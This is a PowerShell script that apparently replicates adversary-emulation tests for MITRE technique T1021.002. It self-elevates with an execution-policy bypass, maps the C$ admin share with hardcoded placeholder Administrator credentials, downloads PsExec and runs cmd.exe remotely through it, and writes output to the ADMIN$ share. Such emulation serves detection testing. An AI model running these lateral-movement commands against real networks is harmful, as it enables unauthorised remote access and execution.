#T1021.002 - Remote Services: SMB/Windows Admin Shares
#Joshua O. Cabauatan
# Self-elevate the script 

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
        exit;
    }
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

#Test #1 -  Map admin share
cmd.exe /c "net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator"

#Test #2 - Map Admin Share PowerShell
New-PSDrive -name g -psprovider filesystem -root \\Target\C$

#Test #3 - Copy and Execute File with PsExec
#Pre-reqCommands:
Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
New-Item -ItemType Directory (Split-Path "C:\PSTools\PsExec.exe") -Force | Out-Null
Copy-Item $env:TEMP\PsTools\PsExec.exe "C:\PSTools\PsExec.exe" -Force


C:\PSTools\PsExec.exe \\localhost -accepteula -c C:\Windows\System32\cmd.exe

#Test #4 - Execute command writing output to local Admin Share
cmd.exe /Q /c hostname 1> \\127.0.0.1\ADMIN$\output.txt 2>&1